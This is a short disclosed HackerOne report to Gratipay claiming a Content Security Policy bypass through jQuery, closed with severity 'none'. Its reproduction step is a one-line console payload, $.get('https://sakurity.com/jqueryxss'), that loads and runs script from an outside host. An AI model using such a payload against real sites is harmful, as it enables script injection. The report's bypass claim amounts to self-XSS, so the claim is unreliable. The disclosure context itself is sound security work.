# CSP Policy Bypass and javascript execution Still Not Fixed

## Report Details
- **Report ID**: 241341
- **URL**: https://hackerone.com/reports/241341
- **State**: Closed
- **Severity**: none
- **Submitted**: 2017-06-19T15:06:15.329Z
- **Disclosed**: 2017-06-19T15:19:40.416Z

## Reporter
- **Username**: 4w3
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gratipay

## Vulnerability Information
# Summary

Content Security Policy (CSP) is a computer security standard introduced to prevent cross-site scripting (XSS), clickjacking and other code injection attacks resulting from execution of malicious content in the trusted web page context. CSP provides a standard method for website owners to declare approved origins of content that browsers should be allowed to load on that website — covered types are JavaScript, CSS, HTML frames, web workers, fonts, images, embeddable objects such as Javascript.


# Steps To Reproduce

  1. Open firefox or Chrome Press F12
  1. Now go to Console Tab
  1. $.get('https://sakurity.com/jqueryxss'); paste it and hit enter
  
# Patch
Update Jquery and Javascript Library 

# Supporting Material/References:
https://youtu.be/JgaSeKNleLA

## Attachments
No attachments
